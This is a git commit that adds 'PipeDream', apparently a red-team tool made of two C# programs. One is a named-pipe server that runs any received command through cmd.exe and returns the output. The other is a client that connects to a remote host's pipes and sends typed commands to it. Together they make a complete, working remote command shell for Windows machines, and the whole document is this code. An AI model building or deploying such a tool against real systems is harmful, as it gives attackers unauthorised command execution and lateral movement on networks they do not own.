5dcdde94f492f568f60a18d0aa7a17153dd18d87
EvilEnigma <evil.enigma.bounty@gmail.com>
2023-05-12 17:08:07 +1000

    Adding PipeDream for peer to peer command execution.

---
+++ PipeDream/Dream/Program.cs
@@ -0,0 +1,88 @@
+﻿using System;
+using System.IO.Pipes;
+using System.Net;
+using System.Text;
+
+class Dream
+{
+    static void Main(string[] args)
+    {
+        string banner = "This is a Dream";
+
+
+        Console.WriteLine(banner);
+
+
+        if (args.Length < 1)
+        {
+            Console.WriteLine("Please specify the IP address where Pipe is setup!.");
+            return;
+        }
+
+        string ipAddressString = args[0];
+        if (!IPAddress.TryParse(ipAddressString, out IPAddress ipAddress))
+        {
+            Console.WriteLine($"Invalid IP address specified: {ipAddressString}");
+            return;
+        }
+
+        var output_namedpipe = new NamedPipeClientStream(ipAddressString, "outpipe", PipeDirection.InOut);
+        var input_namedpipe = new NamedPipeClientStream(ipAddressString, "inpipe", PipeDirection.InOut);
+
+        Console.WriteLine("namedpipe client started.");
+
+        output_namedpipe.Connect();
+        Console.WriteLine("Connected to output namedpipe.");
+
+        input_namedpipe.Connect();
+        Console.WriteLine("Connected to input namedpipe.");
+
+        while (true)
+        {
+            Console.Write("]>: ");
+            string command = Console.ReadLine();
+
+            if (string.IsNullOrEmpty(command))
+            {
+                Console.WriteLine("Empty command received. Skipping...");
+                continue;
+            }
+
+            if (string.IsNullOrWhiteSpace(command))
+            {
+                Console.WriteLine("Empty command received. Skipping...");
+                continue;
+            }
+
+            byte[] buffer = Encoding.ASCII.GetBytes(command);
+            input_namedpipe.Write(buffer, 0, buffer.Length);
+
+            byte[] outputBuffer = new byte[4096];
+            int totalBytesRead = 0;
+            int bytesRead;
+            while ((bytesRead = output_namedpipe.Read(outputBuffer, totalBytesRead, outputBuffer.Length - totalBytesRead)) > 0)
+            {
+                totalBytesRead += bytesRead;
+
+                // Check for null byte
+                if (Array.IndexOf(outputBuffer, (byte)0) >= 0)
+                {
+                    break;
+                }
+            }
+
+            string output = Encoding.ASCII.GetString(outputBuffer, 0, totalBytesRead);
+
+            // Truncate at null byte
+            int nullIndex = output.IndexOf('\0');
+            if (nullIndex >= 0)
+            {
+                output = output.Substring(0, nullIndex);
+            }
+
+            output = output.TrimEnd(); // Trim trailing whitespace
+            Console.WriteLine(output);
+        }
+    }
+}
+
---
+++ PipeDream/Pipe/Program.cs
@@ -0,0 +1,70 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO.Pipes;
+using System.Text;
+using System.Net;
+using System.Runtime.InteropServices;
+
+class Pipe
+{
+    static void Main(string[] args)
+    {
+
+        var input_namedpipe = new NamedPipeServerStream("inpipe", PipeDirection.InOut);
+        var output_namedpipe = new NamedPipeServerStream("outpipe", PipeDirection.InOut);
+
+        Console.WriteLine("Pipe Server has been created, waiting for a dream .");
+
+        while (true)
+        {
+            if (!input_namedpipe.IsConnected)
+            {
+                Console.WriteLine("Waiting for client connection...");
+                input_namedpipe.WaitForConnection();
+                Console.WriteLine("Client connected to input namepipe.");
+            }
+
+            if (!output_namedpipe.IsConnected)
+            {
+                Console.WriteLine("Waiting for client connection...");
+                output_namedpipe.WaitForConnection();
+                Console.WriteLine("Client connected to output namepipe.");
+            }
+
+            byte[] buffer = new byte[4096];
+            int bytesRead = input_namedpipe.Read(buffer, 0, buffer.Length);
+            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
+            Console.WriteLine($"Received command: {command}");
+
+
+            try
+            {
+                Process process = new Process();
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = "/c " + command;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.UseShellExecute = false;
+                process.Start();
+
+                string output = process.StandardOutput.ReadToEnd();
+                process.WaitForExit();
+
+                if (process.ExitCode != 0)
+                {
+                    throw new Exception($"Command failed with exit code {process.ExitCode}");
+                }
+                output = output.Trim();
+                byte[] outputBuffer = Encoding.ASCII.GetBytes(output);
+                output_namedpipe.Write(outputBuffer, 0, outputBuffer.Length);
+
+            }
+
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error executing command: {ex.Message}");
+                output_namedpipe.WriteByte(0);
+            }
+
+        }
+    }
+}
